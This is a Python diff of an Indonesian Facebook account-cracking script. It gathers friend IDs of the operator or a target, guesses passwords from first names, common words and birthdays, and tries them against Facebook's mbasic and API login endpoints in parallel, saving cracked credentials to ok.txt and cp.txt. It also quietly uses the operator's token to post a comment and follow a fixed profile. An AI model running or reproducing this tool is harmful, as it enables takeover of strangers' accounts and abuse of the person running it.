         +###############################
         +# Mau Recode? Sertain author yg buat :v #
         +# Author: Radhin al haady | WA: http://wa.me/62823-7315-8947#76FF00 :v    #
         +###############################
         +
         +#import modulenya :v
         +import requests as req,json,os,time,pyfiglet,re
         +from concurrent.futures import ThreadPoolExecutor as Bool
         +from bs4 import BeautifulSoup as parser
        +try:ua=req.get("https://api-asutoolkit.cloudaccess.host/useragent.txt").text.strip()
        +except req.exceptions.ConnectionError:exit("[!] Kesalahan Pada Koneksi")
        +#nama - nama buat logo :v
        +try:
        +	log=pyfiglet.figlet_format('LOGIN')
        +	title=pyfiglet.figlet_format('CRACK')
        +	teman=pyfiglet.figlet_format('TEMAN')
        +	publik=pyfiglet.figlet_format('PUBLIK')
        +except:os.system('pip install pyfiglet')
        +
        +os.system("clear")
        +#buat nampung data" :v
        +ok,cp,die=0,0,0
        +idTeman,idPublik=[],[]
        +
        +#buat logika login dan login pake token :v
        +def pilihLogin():
        +	pil=input("[?] Pilih yang mana gan : ")
        +	if(pil in ("","  ","   ","    ","     ","      ","       ")):
        +		print("[!] Jangan Kosong tod\n")
        +		pilihLogin()
        +	elif(pil in ("1","01")):
        +		token=input("[!] Access Token Facebook Anda : ")
        +		try:
        +			r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
        +			print("[√] Login Berhasil\nNama Akun :",r['name'])
        +			r2=req.post(f"https://graph.facebook.com/128997902560952/comments/?message=ya jelas bang latip&access_token={token}")
        +			open('log.txt','a').write(token)
        +			time.sleep(2)
        +			nampung(token).menu()
        +		except KeyError:
        +			print('[!] Token Salah')
        +			time.sleep(2)
        +			login()
        +	elif(pil in ("2","02")):
        +		cookie=input("[!] Masukan Cookie Fb Anda : ")
        +		tomken=req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 
        +           'referer': 'https://m.facebook.com/', 
        +           'host': 'm.facebook.com', 
        +           'origin': 'https://m.facebook.com', 
        +           'upgrade-insecure-requests': '1', 
        +           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
        +           'cache-control': 'max-age=0', 
        +           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
        +           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        +		find_token = re.search('(EAAA\w+)',tomken.text)
        +		if (find_token is None):
        +			print("[!] Cookie Salah")
        +			time.sleep(2)
        +			login()
        +		else:
        +			to=find_token.group(1)
        +			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
        +			os.system("clear")
        +			print("[√] Login Berhasil\nNama Akun :",ru['name'])
        +			req.post(f"https://graph.facebook.com/128997902560952/comments/?message=ya jelas bang latip&access_token={to}")
        +			time.sleep(2)
        +			open("log.txt","a").write(to)
        +			nampung(to).menu()
        +			try:
        +				cek=req.get("https://mbasic.facebook.com/100063522272055",cookies={"cookie":cookie}).text
        +				true=False
        +				if "Berhenti mengikuti" not in cek:true=True
        +				if true==True:
        +					req.get("https://mbasic.facebook.com/"+parser(cek,"html.parser").find("a",string="Ikuti").get("href"),cookies={"cookie":cookie})
        +				else:pass
        +			except:pass
        +			nampung(to).menu()
        +	else:
        +		print("[!] lu milih yang mana cok\n")
        +		pilihLogin()
        +def login():
        +	os.system('clear')
        +	print(log+"\nLogin Dolo Bang :>\n[1]. Login Dengan Access Token Fb\n[2]. Login Dengan Cookie Facebook\n")
        +	pilihLogin()
        +def logika():
        +	try:
        +		token=open('log.txt','r').read()
        +		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
        +		print('[√] Anda sudah login\nNama akun anda :',r['name'])
        +		time.sleep(2)
        +		nampung(token).menu()
        +	except KeyError:
        +		print('[!] Token anda invalid')
        +		os.system("rm -rf tt.txt")
        +		time.sleep(2)
        +		login()
        +	except FileNotFoundError:
        +		print('[!] Anda belum login')
        +		time.sleep(2)
        +		login()
        +#class buat ngecrack :v
        +class crack:
        +	
        +	def __init__(self,token):self.token=token
        +	#methode mbasic :v
        +	def mbasic(self,user,pw,ttl):
        +		global ok,cp,die
        +		data={}
        +		ses=req.Session()
        +		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
        +		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
        +		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
        +		for c in a("input"):
        +			try:
        +				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
        +				else:continue
        +			except:pass
        +		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
        +		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
      120 +		if "c_user" in d.cookies:
      121 +			ok+=1
      122 +			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
      123 +			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}         \x1b[0m",end="")
      124 +			print("")
      125 +		elif "checkpoint" in d.cookies:
      126 +			cp+=1
      127 +			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
      128 +			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
      129 +			print("")
      130 +		else:die+=1
      131 +		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
      132 +	def mbasic2(self,user,pw,ttl):
      133 +		global ok,cp,die
      134 +		data={}
      135 +		ses=req.Session()
      136 +		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":ua,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
      137 +		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text,"html.parser")
      138 +		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
      139 +		for c in a("input"):
      140 +			try:
      141 +				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
      142 +				else:continue
      143 +			except:pass
      144 +		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
      145 +		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)
      146 +		if "c_user" in d.cookies:
      147 +			ok+=1
      148 +			open("ok.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
      149 +			print(f"\r\x1b[1;32m[OK] {user} | {pw} | {ttl}         \x1b[0m",end="")
      150 +			print("")
      151 +		elif "checkpoint" in d.cookies:
      152 +			cp+=1
      153 +			open("cp.txt","a").write(user+" | "+pw+" | "+ttl+"\n")
      154 +			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}      \x1b[0m",end="")
      155 +			print("")
      156 +		else:die+=1
      157 +		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
      158 +	#methode api :v
      159 +	def api1(self,user,pw,tll):
      160 +		global ok,cp,die
      161 +		r=json.loads(req.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text)
      162 +		if 'access_token' in r:
      163 +			ok+=1
      164 +			open('ok.txt','a').write(user+' | '+pw+' | '+ttl)
      165 +			print(f'\r\x1b[1;32m[OK] {user} | {pw} {ttl}',end='')
      166 +			print('')
      167 +		elif 'www.facebook.com' in r['error_msg']:
      168 +			cp+=1
      169 +			open('cp.txt','a').write(user+' | '+pw+' | '+ttl)
      170 +			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}",end="")
      171 +			print("")
      172 +		else:die+=1
      173 +		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
      174 +	def api2(self,user,pw,tll):
      175 +		global ok,cp,die
      176 +		r=json.loads(req.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").text)
      177 +		if 'access_token' in r:
      178 +			ok+=1
      179 +			open('ok.txt','a').write(user+' | '+pw+' | '+ttl)
      180 +			print(f'\r\x1b[1;32m[OK] {user} | {pw} {ttl}',end='')
      181 +			print('')
      182 +		elif 'www.facebook.com' in r['error_msg']:
      183 +			cp+=1
      184 +			open('cp.txt','a').write(user+' | '+pw+' | '+ttl)
      185 +			print(f"\r\x1b[1;33m[CP] {user} | {pw} | {ttl}",end="")
      186 +			print("")
      187 +		else:die+=1
      188 +		print(f"\r[=] OK:-{str(ok)} CP:-{str(cp)} DIE:-{str(die)}",end="")
      189 +#class buat nampung id + send ke class crack :v
      190 +class nampung:
      191 +	
      192 +	def __init__(self,token):self.token=token
      193 +	#id teman + send teman :v
      194 +	def sendTeman(self):
      195 +		global idTeman
      196 +		os.system('clear')
      197 +		print(teman+"\nFollow IG @latipharkat_ | Stop? CTRL + Z\n")
      198 +		print('[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
      199 +		pi=input("[?] Mau methode mana : ")
      200 +		time.sleep(1)
      201 +		print("\n[!] Ok save : ok.txt\n[!] Cp save : cp.txt\n")
      202 +		with Bool(max_workers=35) as tokai:
      203 +			r=json.loads(req.get(f"https://graph.facebook.com/me/friends?access_token={self.token}").text)
      204 +			for i in r['data']:idTeman.append(i['id'])
      205 +			print("[√] Jumlah ID :",len(idTeman))
      206 +			time.sleep(1)
      207 +			print("[+] Starting crack...\n==========================\n")
      208 +		if(pi in ("1","01")):
      209 +			with Bool(max_workers=35) as tokai:
      210 +				for j in idTeman:
      211 +					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
      212 +					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
      213 +					except:pass
      214 +					try:
      215 +						for pw in pwList:tokai.submit(crack(self.token).mbasic,j,pw,pwList[-1])
      216 +					except:pass
      217 +		elif(pi in ("2","02")):
      218 +			with Bool(max_workers=35) as tokai:
      219 +				for j in idTeman:
      220 +					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
      221 +					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
      222 +					except:pass
      223 +					try:
      224 +						for pw in pwList:tokai.submit(crack(self.token).api1,j,pw,pwList[-1])
      225 +					except:pass
      226 +	#id publik + send publik :v
      227 +	def sendPublik(self):
      228 +		global idPublik
      229 +		os.system('clear')
      230 +		print(publik+"\nFollow IG : @latipharkat_ | Stop? CTRL + Z\n")
      231 +		print('\n[!] Pilih Methode Crack\n[1]. Methode Mbasic (Sedang, tidak cp semua)\n[2]. Methode Api (Cepat, kemungkinan cp semua)\n')
      232 +		pi=input("[?] Mau methode mana : ")
      233 +		print("")
      234 +		target=input("[?] ID FB target/publik : ")
      235 +		try:
      236 +			t=json.loads(req.get(f"https://graph.facebook.com/{target}?access_token={self.token}").text)
      237 +			print("\n[+] Nama target/publik :",t['name'])
      238 +		except:
      239 +			print('[×] Target/Publik Tidak Ditemukan')
      240 +			time.sleep(2)
      241 +			nampung(self.token).menu()
      242 +		with Bool(max_workers=35) as tokai:
      243 +			r=json.loads(req.get(f"https://graph.facebook.com/{target}/friends?access_token={self.token}").text)
      244 +			for i in r['data']:idPublik.append(i['id'])
      245 +			print("[+] Jumlah ID :",len(idPublik))
      246 +			time.sleep(1)
      247 +			print("\n[!] Ok save : ok.txt\n[!] Cp save : cp.txt\n==========================\n")
      248 +		if(pi in ("1","01")):
      249 +			with Bool(max_workers=35) as tokai:
      250 +				for j in idPublik:
      251 +					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
      252 +					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
      253 +					except:pass
      254 +					try:
      255 +						for pw in pwList:tokai.submit(crack(self.token).mbasic2,j,pw,pwList[-1])
      256 +					except:pass
      257 +		elif(pi in ("2","02")):
      258 +			with Bool(max_workers=35) as tokai:
      259 +				for j in idPublik:
      260 +					r2=json.loads(req.get(f"https://graph.facebook.com/{j}?access_token={self.token}").text)
      261 +					try:pwList=[r2['first_name']+'11',r2['first_name']+'12',r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345',r2['first_name']+'123456',r2['first_name']+'1234567','Sayang','Sayang123','Bangsad','Bangsad123','Monyet','Monyet123','Indonesia','Anjing','Anjing123','Freefire','Freefire123','Kontol','Kontol123','Motor123',r2['birthday']]
      262 +					except:pass
      263 +					try:
      264 +						for pw in pwList:tokai.submit(crack(self.token).api2,j,pw,pwList[-1])
      265 +					except:pass
      266 +	#menu buat nentuin mau crack apa + methode apa :v
      267 +	def pilihan(self):
      268 +		pilih=input("[?] Pilih yang mana : ")
      269 +		if pilih in ("01","1"):nampung(self.token).sendTeman()
      270 +		elif pilih in ("02","2"):nampung(self.token).sendPublik()
      271 +		elif pilih=="99":
      272 +			os.system("rm -rf log.txt")
      273 +			exit("[√] Logout Berhasil")
      274 +		else:
      275 +			print("[!] Pilihan tidak ada\n")
      276 +			nampung(self.token).pilihan()
      277 +	def menu(self):
      278 +		os.system("clear")
      279 +		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={self.token}").text)
      280 +		print(title+"\nUID :",r['id'],"\nNAMA :",r['name'],"\nTTL-AKUN :",r['birthday'],"\n=============================\n[1]. Crack ID FriendsList\n[2]. Crack ID Teman/Publik\n[99]. Hapus Cookies\n")
      281 +		nampung(self.token).pilihan()
      282 +		
      283 +#running :v		
      284 +if __name__=="__main__":
      285 +	logika()
          \ No newline at end of file